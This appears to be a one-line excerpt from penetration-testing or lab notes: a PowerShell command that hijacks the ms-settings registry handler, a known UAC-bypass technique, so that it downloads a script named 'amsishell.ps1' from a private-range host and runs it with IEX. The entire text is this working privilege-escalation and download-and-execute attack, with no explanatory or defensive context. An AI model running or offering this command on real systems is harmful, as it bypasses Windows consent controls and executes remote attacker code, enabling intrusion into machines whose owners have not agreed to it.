...
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.49.244/amsishell.ps1') | IEX" -Force
